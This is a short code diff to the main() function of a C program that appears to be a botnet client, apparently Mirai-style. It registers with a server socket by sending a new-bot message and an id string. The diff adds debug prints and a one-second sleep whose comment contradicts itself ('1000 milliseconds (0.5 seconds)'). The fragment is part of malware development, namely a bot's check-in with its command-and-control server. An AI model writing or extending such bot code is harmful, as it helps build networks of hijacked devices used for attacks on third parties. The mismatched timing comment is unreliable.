@@ -289,10 +289,15 @@ int main(int argc, char **args)
 
                     printf("addrs: %s\n", args[2]);
                     LOCAL_ADDR = util_local_addr(args[2]);
+                    printf("Send new bot msg\n");
                     send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
+                    usleep(1000000); // Pause for 1000 milliseconds (0.5 seconds)
+
+                    // printf("Send id identifier req\n");
                     send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                     if (id_len > 0)
                     {
+                        // printf("send id_buf\n");
                         send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                     }
 #ifdef DEBUG
